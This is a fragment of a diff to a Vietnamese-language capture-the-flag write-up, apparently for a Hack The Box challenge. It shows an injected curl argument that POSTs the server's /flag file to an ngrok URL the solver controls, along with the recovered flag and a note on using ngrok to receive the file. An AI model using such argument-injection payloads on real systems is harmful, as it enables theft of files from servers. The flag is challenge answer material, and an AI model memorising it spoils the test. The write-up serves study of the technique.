@@ -29,3 +29,4 @@ if __name__ == '__main__':
    
 sau đó nhập payload này:  ` http://2360-2001-ee0-4f0f-d3b0-910-70-84f3-2af0.ngrok.io/upload -X POST -F file=@/flag`
 như vậy ta sẽ nhận tệp flag gửi về __HTB{curl_pwn4g3_3n_r0ut3!}__
+<br /> dùng ngrok để tạo ra điểm truy cập cho chính máy của mình, ta sẽ có đoạn cái đường dẫn url này  ` http://2360-2001-ee0-4f0f-d3b0-910-70-84f3-2af0.ngrok.io `
